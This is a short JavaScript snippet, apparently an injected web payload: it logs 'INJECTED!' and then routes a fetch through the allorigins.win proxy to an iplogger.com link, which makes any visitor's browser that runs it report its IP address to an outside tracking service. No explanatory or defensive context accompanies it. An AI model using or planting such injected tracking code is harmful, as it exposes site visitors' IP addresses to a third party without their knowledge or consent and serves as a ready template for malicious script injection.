console.log("INJECTED!");
fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://iplogger.com/2KWVg4'))
  .then(response => {
    if (!response.ok) {
      throw new Error('Network response was not ok');
    }
    return response.json();
  })
  .then(data => {
    console.log(data.contents); // Handle the JSON response data here
  })
  .catch(error => {
    console.error('There was a problem with the request:', error);
  });
